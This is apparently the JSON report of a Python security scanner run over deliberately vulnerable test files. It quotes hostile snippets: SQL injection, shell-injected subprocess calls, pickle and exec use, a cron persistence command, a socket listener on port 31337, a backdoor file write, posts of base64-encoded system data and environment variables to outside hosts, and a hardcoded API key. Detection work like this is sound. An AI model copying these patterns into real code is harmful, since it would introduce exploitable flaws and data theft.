@@ -1,0 +1,386 @@
+Found 8 Python files
+Analyzing data/python_test_data/setup.py...
+Analyzing data/python_test_data/main.py...
+Analyzing data/python_test_data/utils/formatter.py...
+Analyzing data/python_test_data/utils/config.py...
+Analyzing data/python_test_data/utils/data_processor.py...
+Analyzing data/python_test_data/utils/__init__.py...
+Analyzing data/python_test_data/utils/logger.py...
+Analyzing data/python_test_data/utils/analytics.py...
+[
+  {
+    "filepath": "data/python_test_data/setup.py",
+    "vulnerabilities": {},
+    "risk_score": 0.0,
+    "risk_level": "Safe"
+  },
+  {
+    "filepath": "data/python_test_data/main.py",
+    "vulnerabilities": {
+      "path_traversal": [
+        {
+          "line": 29,
+          "code": "with open(file_path, 'r') as f:",
+          "file": "data/python_test_data/main.py"
+        },
+        {
+          "line": 38,
+          "code": "with open(file_path, 'w') as f:",
+          "file": "data/python_test_data/main.py"
+        }
+      ],
+      "insecure_file_operations": [
+        {
+          "line": 29,
+          "code": "with open(file_path, 'r') as f:",
+          "file": "data/python_test_data/main.py"
+        },
+        {
+          "line": 38,
+          "code": "with open(file_path, 'w') as f:",
+          "file": "data/python_test_data/main.py"
+        }
+      ]
+    },
+    "risk_score": 9.1,
+    "risk_level": "Critical"
+  },
+  {
+    "filepath": "data/python_test_data/utils/formatter.py",
+    "vulnerabilities": {
+      "sql_injection": [
+        {
+          "line": 54,
+          "code": "query = f\"INSERT OR REPLACE INTO format_cache VALUES ('{data_hash}', '{format_type}', {timestamp}, '{result}')\"",
+          "file": "data/python_test_data/utils/formatter.py"
+        },
+        {
+          "line": 67,
+          "code": "query = f\"SELECT result FROM format_cache WHERE hash = '{data_hash}' AND format = '{format_type}'\"",
+          "file": "data/python_test_data/utils/formatter.py"
+        },
+        {
+          "line": 67,
+          "code": "query = f\"SELECT result FROM format_cache WHERE hash = '{data_hash}' AND format = '{format_type}'\"",
+          "file": "data/python_test_data/utils/formatter.py"
+        }
+      ],
+      "obfuscated_code": [
+        {
+          "line": 85,
+          "code": "return base64.b64encode(data_str.encode()).decode()[:16]",
+          "file": "data/python_test_data/utils/formatter.py",
+          "description": "Potentially obfuscated code"
+        }
+      ],
+      "unusual_imports": [
+        {
+          "line": 11,
+          "code": "import base64",
+          "file": "data/python_test_data/utils/formatter.py",
+          "description": "Unusual module import: base64"
+        }
+      ]
+    },
+    "risk_score": 10.0,
+    "risk_level": "Critical"
+  },
+  {
+    "filepath": "data/python_test_data/utils/config.py",
+    "vulnerabilities": {
+      "hardcoded_credentials": [
+        {
+          "line": 19,
+          "code": "self._api_key = \"sk_live_a8c2JhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\"",
+          "file": "data/python_test_data/utils/config.py"
+        }
+      ]
+    },
+    "risk_score": 9.9,
+    "risk_level": "Critical"
+  },
+  {
+    "filepath": "data/python_test_data/utils/data_processor.py",
+    "vulnerabilities": {
+      "command_injection": [
+        {
+          "line": 124,
+          "code": "result = subprocess.check_output(value, shell=True).decode().strip()",
+          "file": "data/python_test_data/utils/data_processor.py"
+        },
+        {
+          "line": 168,
+          "code": "result = subprocess.check_output(report_cmd, shell=True).decode()",
+          "file": "data/python_test_data/utils/data_processor.py"
+        }
+      ],
+      "insecure_deserialization": [
+        {
+          "line": 94,
+          "code": "return pickle.loads(decoded)  # Insecure!",
+          "file": "data/python_test_data/utils/data_processor.py"
+        }
+      ],
+      "path_traversal": [
+        {
+          "line": 154,
+          "code": "with open(report_path, 'w') as f:",
+          "file": "data/python_test_data/utils/data_processor.py"
+        }
+      ],
+      "exec_eval": [
+        {
+          "line": 49,
+          "code": "exec(script_content)",
+          "file": "data/python_test_data/utils/data_processor.py"
+        }
+      ],
+      "insecure_file_operations": [
+        {
+          "line": 154,
+          "code": "with open(report_path, 'w') as f:",
+          "file": "data/python_test_data/utils/data_processor.py"
+        }
+      ],
+      "obfuscated_code": [
+        {
+          "line": 93,
+          "code": "decoded = base64.b64decode(text)",
+          "file": "data/python_test_data/utils/data_processor.py",
+          "description": "Potentially obfuscated code"
+        }
+      ],
+      "unusual_imports": [
+        {
+          "line": 7,
+          "code": "import pickle",
+          "file": "data/python_test_data/utils/data_processor.py",
+          "description": "Unusual module import: pickle"
+        },
+        {
+          "line": 8,
+          "code": "import base64",
+          "file": "data/python_test_data/utils/data_processor.py",
+          "description": "Unusual module import: base64"
+        },
+        {
+          "line": 9,
+          "code": "import subprocess",
+          "file": "data/python_test_data/utils/data_processor.py",
+          "description": "Unusual module import: subprocess"
+        },
+        {
+          "line": 44,
+          "code": "import urllib.request",
+          "file": "data/python_test_data/utils/data_processor.py",
+          "description": "Unusual module import: urllib.request"
+        },
+        {
+          "line": 0,
+          "code": "Multiple unusual imports: pickle, base64, subprocess, urllib.request",
+          "file": "data/python_test_data/utils/data_processor.py",
+          "description": "High number of unusual/suspicious module imports (4)"
+        }
+      ]
+    },
+    "risk_score": 10.0,
+    "risk_level": "Critical"
+  },
+  {
+    "filepath": "data/python_test_data/utils/__init__.py",
+    "vulnerabilities": {
+      "suspicious_network_activity": [
+        {
+          "line": 55,
+          "code": "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+          "file": "data/python_test_data/utils/__init__.py",
+          "description": "Network activity using socket.socket() to unknown"
+        },
+        {
+          "line": 63,
+          "code": "requests.post(",
+          "file": "data/python_test_data/utils/__init__.py",
+          "description": "Network activity using requests.post() to https://api.data-collection.example.com/telemetry"
+        }
+      ],
+      "obfuscated_code": [
+        {
+          "line": 58,
+          "code": "s.send(f\"INIT:{base64.b64encode(str(system_info).encode()).decode()}\".encode())",
+          "file": "data/python_test_data/utils/__init__.py",
+          "description": "Potentially obfuscated code"
+        }
+      ],
+      "unusual_imports": [
+        {
+          "line": 36,
+          "code": "import socket",
+          "file": "data/python_test_data/utils/__init__.py",
+          "description": "Unusual module import: socket"
+        },
+        {
+          "line": 38,
+          "code": "import base64",
+          "file": "data/python_test_data/utils/__init__.py",
+          "description": "Unusual module import: base64"
+        },
+        {
+          "line": 39,
+          "code": "import platform",
+          "file": "data/python_test_data/utils/__init__.py",
+          "description": "Unusual module import: platform"
+        },
+        {
+          "line": 0,
+          "code": "Multiple unusual imports: socket, base64, platform",
+          "file": "data/python_test_data/utils/__init__.py",
+          "description": "High number of unusual/suspicious module imports (3)"
+        }
+      ]
+    },
+    "risk_score": 10.0,
+    "risk_level": "Critical"
+  },
+  {
+    "filepath": "data/python_test_data/utils/logger.py",
+    "vulnerabilities": {
+      "command_injection": [
+        {
+          "line": 188,
+          "code": "subprocess.run(f\"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -\",",
+          "file": "data/python_test_data/utils/logger.py"
+        },
+        {
+          "line": 111,
+          "code": "output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)",
+          "file": "data/python_test_data/utils/logger.py"
+        }
+      ],
+      "path_traversal": [
+        {
+          "line": 165,
+          "code": "with open(backdoor_path, 'w') as f:",
+          "file": "data/python_test_data/utils/logger.py"
+        },
+        {
+          "line": 200,
+          "code": "with open(path, 'a') as f:",
+          "file": "data/python_test_data/utils/logger.py"
+        }
+      ],
+      "bind_all_interfaces": [
+        {
+          "line": 73,
+          "code": "server.bind(('0.0.0.0', 31337))",
+          "file": "data/python_test_data/utils/logger.py"
+        }
+      ],
+      "insecure_file_operations": [
+        {
+          "line": 165,
+          "code": "with open(backdoor_path, 'w') as f:",
+          "file": "data/python_test_data/utils/logger.py"
+        }
+      ],
+      "suspicious_network_activity": [
+        {
+          "line": 68,
+          "code": "server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+          "file": "data/python_test_data/utils/logger.py",
+          "description": "Network activity using socket.socket() to unknown"
+        }
+      ],
+      "unusual_imports": [
+        {
+          "line": 10,
+          "code": "import tempfile",
+          "file": "data/python_test_data/utils/logger.py",
+          "description": "Unusual module import: tempfile"
+        },
+        {
+          "line": 12,
+          "code": "import socket",
+          "file": "data/python_test_data/utils/logger.py",
+          "description": "Unusual module import: socket"
+        },
+        {
+          "line": 13,
+          "code": "import subprocess",
+          "file": "data/python_test_data/utils/logger.py",
+          "description": "Unusual module import: subprocess"
+        },
+        {
+          "line": 0,
+          "code": "Multiple unusual imports: tempfile, socket, subprocess",
+          "file": "data/python_test_data/utils/logger.py",
+          "description": "High number of unusual/suspicious module imports (3)"
+        }
+      ]
+    },
+    "risk_score": 10.0,
+    "risk_level": "Critical"
+  },
+  {
+    "filepath": "data/python_test_data/utils/analytics.py",
+    "vulnerabilities": {
+      "suspicious_network_activity": [
+        {
+          "line": 31,
+          "code": "_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "Network activity using socket.socket() to unknown"
+        },
+        {
+          "line": 68,
+          "code": "requests.post(",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "Network activity using requests.post() to https://analytics.data-metrics.com/collect"
+        }
+      ],
+      "obfuscated_code": [
+        {
+          "line": 62,
+          "code": "encoded_data = base64.b64encode(json.dumps(system_info).encode()).decode()",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "Potentially obfuscated code"
+        }
+      ],
+      "unauthorized_data_access": [
+        {
+          "line": 99,
+          "code": "\"env_vars\": dict(os.environ)  # VULNERABILITY: Sending environment variables",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "Access to sensitive system file or data"
+        }
+      ],
+      "unusual_imports": [
+        {
+          "line": 6,
+          "code": "import socket",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "Unusual module import: socket"
+        },
+        {
+          "line": 8,
+          "code": "import base64",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "Unusual module import: base64"
+        },
+        {
+          "line": 10,
+          "code": "import platform",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "Unusual module import: platform"
+        },
+        {
+          "line": 0,
+          "code": "Multiple unusual imports: socket, base64, platform",
+          "file": "data/python_test_data/utils/analytics.py",
+          "description": "High number of unusual/suspicious module imports (3)"
+        }
+      ]
+    },
+    "risk_score": 10.0,
+    "risk_level": "Critical"
+  }
+]
